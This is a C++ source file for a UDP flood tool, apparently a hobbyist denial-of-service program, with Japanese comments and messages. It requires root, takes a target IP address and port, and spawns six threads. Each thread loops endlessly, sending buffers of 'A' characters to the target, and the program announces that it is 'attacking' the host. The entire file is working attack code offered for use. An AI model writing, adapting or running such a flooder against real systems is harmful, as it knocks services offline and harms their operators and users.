#include<cstdio>
#include<cstdlib>
#include<cstring>
#include<netdb.h>
#include<netinet/in.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#include <sys/types.h>
#include <unistd.h>

#include <thread>

const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";

void attack(char* str, int port)
{
    int soc, soc2;
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (true) {
        try {
            //ソケット生成
            soc = soc2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(soc, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
            sendto(soc2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(soc);
            (*F_close)(soc2);
        }
        catch (...) {
            perror("Error ");
            exit(-1);
        }
    }
}

void attack2(char* str, int port)
{
    int sock, sock2;
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (true) {
        try {
            //ソケット生成
            sock = sock2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
            sendto(sock2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(sock);
            (*F_close)(sock2);
        }
        catch (...) {
            perror("Error ");
            exit(-1);
        }
    }
}

void attack3(char* str, int port)
{
    int socks, socks2;
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (true) {
        try {
            //ソケット生成
            socks = socks2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(socks, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
            sendto(socks2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(socks);
            (*F_close)(socks2);
        }
        catch (...) {
            perror("Error ");
            exit(-1);
        }
    }
}

int main(int argc, char* argv[])
{
    if (getuid() != 0) {
        printf("\n管理者権限じゃないと10Mbps超えなかったから\nsudoを付けて実行をしてね。\n\n");
        return -1;
    }

  　struct hostent* he;
    char* str = nullptr;
    int port;

    if (argc < 3) {
        printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
        return -1;
    }

    if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
        perror("Error ");
        return -1;
    }

    port = atoi(argv[2]);

    str = he->h_name;

    printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);

    std::thread t1(attack, str, port);
    std::thread t2(attack, str, port);
    std::thread t3(attack2, str, port);
    std::thread t4(attack2, str, port);
    std::thread t5(attack3, str, port);
    std::thread t6(attack3, str, port);

    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    t6.join();

    return 0;
}
